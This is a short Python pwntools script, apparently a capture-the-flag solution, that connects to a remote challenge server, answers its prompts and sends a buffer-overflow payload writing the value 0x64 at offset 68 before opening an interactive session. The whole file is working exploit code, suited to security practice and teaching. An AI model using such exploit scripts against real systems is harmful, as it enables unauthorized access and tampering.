from pwn import * 
import ctypes
import time
exe = context.binary = ELF('chal')
io = remote('34.70.212.151', 8004) #exe.process()

payload = fit({
    68: 0x00000064
})

io.recvuntil(b'Roll Number : ')
io.sendline(b'2')
io.recvuntil(b'Name : ')
io.sendline(b'2')
io.recvuntil(b'Any Comments ?')
io.sendline(payload)
io.interactive()